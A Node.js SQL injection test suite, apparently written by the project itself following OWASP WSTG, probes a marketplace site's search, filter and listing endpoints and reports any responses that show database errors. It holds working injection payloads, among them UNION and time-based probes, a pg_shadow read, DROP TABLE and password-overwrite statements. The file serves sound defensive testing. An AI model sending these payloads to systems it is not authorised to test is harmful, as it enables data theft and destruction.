/**
 * ByeBuy SQL Injection Security Test Suite
 * Based on OWASP Web Security Testing Guide (WSTG) Chapter 4.7.5
 * 
 * This script systematically tests ByeBuy for SQL injection vulnerabilities
 * across all identified user input points that interact with the database.
 * 
 * Usage: node sql-injection-test-suite.js [BASE_URL]
 * Example: node sql-injection-test-suite.js https://byebuy.in
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

// Configuration
const BASE_URL = process.argv[2] || 'http://localhost:3000';
const TIMEOUT = 10000; // 10 seconds
const USER_AGENT = 'ByeBuy-Security-Test-Suite/1.0';

// OWASP WSTG SQL Injection Test Payloads
const SQL_INJECTION_PAYLOADS = {
  // Basic detection payloads
  basic: [
    "'",
    "\"",
    ";",
    "'--",
    "\"--",
    "';--",
    "\";--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"a\"=\"a",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1"
  ],
  
  // Comment-based payloads
  comments: [
    "'/*",
    "'*/",
    "';/*",
    "'*/;",
    "'/**/",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--"
  ],
  
  // Boolean-based blind SQL injection
  boolean: [
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "' AND 'a'='a'--",
    "' AND 'a'='b'--",
    "' AND SUBSTRING(VERSION(),1,1)='5'--",
    "' AND SUBSTRING(VERSION(),1,1)='P'--" // PostgreSQL starts with 'P'
  ],
  
  // Time-based blind SQL injection
  timeBased: [
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT COUNT(*) FROM pg_sleep(5))>0--",
    "' OR (SELECT COUNT(*) FROM pg_sleep(5))>0--"
  ],
  
  // Union-based SQL injection
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT version(),NULL--",
    "' UNION SELECT user,NULL--",
    "' UNION SELECT current_database(),NULL--",
    "' UNION SELECT table_name FROM information_schema.tables--"
  ],
  
  // Error-based SQL injection
  error: [
    "'",
    "''",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND CAST((SELECT version()) AS int)--"
  ],
  
  // Stacked queries
  stacked: [
    "'; DROP TABLE users; --",
    "'; INSERT INTO users VALUES ('test','test'); --",
    "'; UPDATE users SET password='hacked'; --",
    "'; SELECT * FROM pg_stat_activity; --",
    "'; CREATE TABLE test_injection (id INT); --"
  ],
  
  // PostgreSQL specific payloads
  postgresql: [
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' UNION SELECT NULL,version()--",
    "' AND 1=1 AND SUBSTRING(version(),1,10)='PostgreSQL'--",
    "'; SELECT * FROM pg_user; --",
    "'; SELECT * FROM pg_shadow; --",
    "' AND 1=(SELECT COUNT(*) FROM pg_stat_activity WHERE query LIKE '%SELECT%')--"
  ]
};

// Test endpoints and parameters
const TEST_ENDPOINTS = [
  {
    name: 'Search Functionality',
    path: '/listings',
    method: 'GET',
    params: { search: 'PAYLOAD' },
    description: 'Primary search functionality using ilike queries',
    critical: true
  },
  {
    name: 'Category Filter',
    path: '/listings',
    method: 'GET', 
    params: { category: 'PAYLOAD' },
    description: 'Category filtering functionality',
    critical: false
  },
  {
    name: 'Listing Detail by ID',
    path: '/listings/PAYLOAD',
    method: 'GET',
    params: {},
    description: 'Listing detail page with UUID parameter',
    critical: true
  },
  {
    name: 'Sort Parameter',
    path: '/listings',
    method: 'GET',
    params: { sort: 'PAYLOAD' },
    description: 'Sort functionality parameter',
    critical: false
  }
];

// Results tracking
const testResults = {
  total: 0,
  passed: 0,
  failed: 0,
  suspicious: 0,
  details: []
};

/**
 * Make HTTP request with timeout
 */
function makeRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const isHttps = urlObj.protocol === 'https:';
    const client = isHttps ? https : http;
    
    const requestOptions = {
      hostname: urlObj.hostname,
      port: urlObj.port || (isHttps ? 443 : 80),
      path: urlObj.pathname + urlObj.search,
      method: options.method || 'GET',
      headers: {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        ...options.headers
      },
      timeout: TIMEOUT
    };

    const req = client.request(requestOptions, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data,
          responseTime: Date.now() - startTime
        });
      });
    });

    const startTime = Date.now();
    
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });
    
    if (options.body) {
      req.write(options.body);
    }
    
    req.end();
  });
}

/**
 * Analyze response for SQL injection indicators
 */
function analyzeResponse(response, payload, testInfo) {
  const analysis = {
    vulnerable: false,
    suspicious: false,
    indicators: [],
    severity: 'low'
  };

  const body = response.body.toLowerCase();
  const statusCode = response.statusCode;

  // SQL error patterns (PostgreSQL specific)
  const sqlErrorPatterns = [
    /syntax error at or near/i,
    /unterminated quoted string/i,
    /invalid input syntax/i,
    /column .* does not exist/i,
    /relation .* does not exist/i,
    /function .* does not exist/i,
    /permission denied for/i,
    /pg_/i,
    /postgresql/i,
    /psql/i,
    /error.*sql/i,
    /database error/i,
    /query failed/i,
    /syntax error/i,
    /ora-\d+/i,
    /mysql/i,
    /microsoft.*ole.*db/i
  ];

  // Check for SQL errors
  for (const pattern of sqlErrorPatterns) {
    if (pattern.test(body)) {
      analysis.vulnerable = true;
      analysis.indicators.push(`SQL Error Pattern: ${pattern.source}`);
      analysis.severity = 'high';
    }
  }

  // Check for database information disclosure
  const infoDisclosurePatterns = [
    /version\(\)/i,
    /current_user/i,
    /current_database/i,
    /information_schema/i,
    /pg_stat_activity/i,
    /pg_user/i,
    /pg_shadow/i
  ];

  for (const pattern of infoDisclosurePatterns) {
    if (pattern.test(body)) {
      analysis.suspicious = true;
      analysis.indicators.push(`Info Disclosure: ${pattern.source}`);
      analysis.severity = analysis.severity === 'high' ? 'high' : 'medium';
    }
  }

  // Check for unusual response times (time-based injection)
  if (response.responseTime > 5000 && payload.includes('sleep')) {
    analysis.suspicious = true;
    analysis.indicators.push(`Unusual response time: ${response.responseTime}ms`);
    analysis.severity = analysis.severity === 'high' ? 'high' : 'medium';
  }

  // Check for HTTP error codes that might indicate backend issues
  if (statusCode >= 500) {
    analysis.suspicious = true;
    analysis.indicators.push(`Server Error: HTTP ${statusCode}`);
  }

  // Check for different response patterns (boolean-based)
  if (payload.includes('1=1') || payload.includes('1=2')) {
    // This would require baseline comparison - simplified for now
    if (body.length === 0 && statusCode === 200) {
      analysis.suspicious = true;
      analysis.indicators.push('Empty response with boolean payload');
    }
  }

  return analysis;
}

/**
 * Test a specific endpoint with a payload
 */
async function testEndpoint(endpoint, payload, payloadType) {
  testResults.total++;
  
  try {
    let testUrl = BASE_URL + endpoint.path;
    let testParams = { ...endpoint.params };
    
    // Replace PAYLOAD placeholder
    if (endpoint.path.includes('PAYLOAD')) {
      testUrl = testUrl.replace('PAYLOAD', encodeURIComponent(payload));
    }
    
    // Replace payload in parameters
    Object.keys(testParams).forEach(key => {
      if (testParams[key] === 'PAYLOAD') {
        testParams[key] = payload;
      }
    });
    
    // Build query string
    if (Object.keys(testParams).length > 0) {
      const queryString = new URLSearchParams(testParams).toString();
      testUrl += '?' + queryString;
    }
    
    console.log(`Testing: ${endpoint.name} with ${payloadType} payload: "${payload}"`);
    console.log(`URL: ${testUrl}`);
    
    const response = await makeRequest(testUrl, { method: endpoint.method });
    const analysis = analyzeResponse(response, payload, endpoint);
    
    const result = {
      endpoint: endpoint.name,
      payload,
      payloadType,
      url: testUrl,
      statusCode: response.statusCode,
      responseTime: response.responseTime,
      analysis,
      timestamp: new Date().toISOString()
    };
    
    testResults.details.push(result);
    
    if (analysis.vulnerable) {
      testResults.failed++;
      console.log(`❌ VULNERABLE: ${endpoint.name}`);
      console.log(`   Indicators: ${analysis.indicators.join(', ')}`);
      console.log(`   Severity: ${analysis.severity.toUpperCase()}`);
    } else if (analysis.suspicious) {
      testResults.suspicious++;
      console.log(`⚠️  SUSPICIOUS: ${endpoint.name}`);
      console.log(`   Indicators: ${analysis.indicators.join(', ')}`);
    } else {
      testResults.passed++;
      console.log(`✅ SAFE: ${endpoint.name}`);
    }
    
    console.log('---');
    
    // Small delay to avoid overwhelming the server
    await new Promise(resolve => setTimeout(resolve, 100));
    
  } catch (error) {
    console.log(`❌ ERROR testing ${endpoint.name}: ${error.message}`);
    testResults.details.push({
      endpoint: endpoint.name,
      payload,
      payloadType,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
}

/**
 * Generate comprehensive test report
 */
function generateReport() {
  const report = {
    summary: {
      testDate: new Date().toISOString(),
      baseUrl: BASE_URL,
      totalTests: testResults.total,
      passed: testResults.passed,
      failed: testResults.failed,
      suspicious: testResults.suspicious,
      overallStatus: testResults.failed > 0 ? 'VULNERABLE' : 
                    testResults.suspicious > 0 ? 'NEEDS_REVIEW' : 'SECURE'
    },
    vulnerabilities: testResults.details.filter(r => r.analysis?.vulnerable),
    suspicious: testResults.details.filter(r => r.analysis?.suspicious && !r.analysis?.vulnerable),
    recommendations: []
  };

  // Add recommendations based on findings
  if (report.vulnerabilities.length > 0) {
    report.recommendations.push(
      'CRITICAL: SQL injection vulnerabilities detected. Immediate remediation required.',
      'Review all database queries for proper parameterization.',
      'Implement input validation and sanitization.',
      'Consider using prepared statements exclusively.',
      'Review Supabase RPC functions for raw SQL construction.'
    );
  }

  if (report.suspicious.length > 0) {
    report.recommendations.push(
      'Suspicious patterns detected. Further investigation recommended.',
      'Review error handling to prevent information disclosure.',
      'Implement proper logging and monitoring.',
      'Consider rate limiting for search functionality.'
    );
  }

  if (report.vulnerabilities.length === 0 && report.suspicious.length === 0) {
    report.recommendations.push(
      'No obvious SQL injection vulnerabilities detected.',
      'Continue regular security testing.',
      'Monitor for new attack vectors.',
      'Keep Supabase client libraries updated.'
    );
  }

  return report;
}

/**
 * Main test execution
 */
async function runTests() {
  console.log('🔍 ByeBuy SQL Injection Security Test Suite');
  console.log('📋 Based on OWASP Web Security Testing Guide (WSTG) 4.7.5');
  console.log(`🎯 Target: ${BASE_URL}`);
  console.log('=' .repeat(60));
  console.log();

  // Test each endpoint with each payload type
  for (const endpoint of TEST_ENDPOINTS) {
    console.log(`🧪 Testing Endpoint: ${endpoint.name}`);
    console.log(`📝 Description: ${endpoint.description}`);
    console.log(`⚡ Critical: ${endpoint.critical ? 'YES' : 'NO'}`);
    console.log();

    // Test with different payload categories
    const payloadCategories = endpoint.critical ? 
      ['basic', 'boolean', 'union', 'error', 'postgresql'] : 
      ['basic', 'boolean'];

    for (const category of payloadCategories) {
      const payloads = SQL_INJECTION_PAYLOADS[category] || [];
      
      for (const payload of payloads.slice(0, 3)) { // Limit payloads per category
        await testEndpoint(endpoint, payload, category);
      }
    }
    
    console.log();
  }

  // Generate and display report
  const report = generateReport();
  
  console.log('📊 TEST SUMMARY');
  console.log('=' .repeat(60));
  console.log(`Total Tests: ${report.summary.totalTests}`);
  console.log(`Passed: ${report.summary.passed}`);
  console.log(`Failed: ${report.summary.failed}`);
  console.log(`Suspicious: ${report.summary.suspicious}`);
  console.log(`Overall Status: ${report.summary.overallStatus}`);
  console.log();

  if (report.vulnerabilities.length > 0) {
    console.log('🚨 VULNERABILITIES DETECTED:');
    report.vulnerabilities.forEach((vuln, index) => {
      console.log(`${index + 1}. ${vuln.endpoint}`);
      console.log(`   Payload: ${vuln.payload}`);
      console.log(`   Indicators: ${vuln.analysis.indicators.join(', ')}`);
      console.log(`   Severity: ${vuln.analysis.severity.toUpperCase()}`);
      console.log();
    });
  }

  if (report.suspicious.length > 0) {
    console.log('⚠️  SUSPICIOUS PATTERNS:');
    report.suspicious.forEach((susp, index) => {
      console.log(`${index + 1}. ${susp.endpoint}`);
      console.log(`   Payload: ${susp.payload}`);
      console.log(`   Indicators: ${susp.analysis.indicators.join(', ')}`);
      console.log();
    });
  }

  console.log('💡 RECOMMENDATIONS:');
  report.recommendations.forEach((rec, index) => {
    console.log(`${index + 1}. ${rec}`);
  });
  console.log();

  // Save detailed report to file
  const fs = require('fs');
  const reportFilename = `byebuy-sql-injection-test-report-${Date.now()}.json`;
  fs.writeFileSync(reportFilename, JSON.stringify(report, null, 2));
  console.log(`📄 Detailed report saved to: ${reportFilename}`);

  // Exit with appropriate code
  process.exit(report.vulnerabilities.length > 0 ? 1 : 0);
}

// Run the tests
if (require.main === module) {
  runTests().catch(error => {
    console.error('❌ Test suite failed:', error);
    process.exit(1);
  });
}

module.exports = { runTests, SQL_INJECTION_PAYLOADS, TEST_ENDPOINTS }; 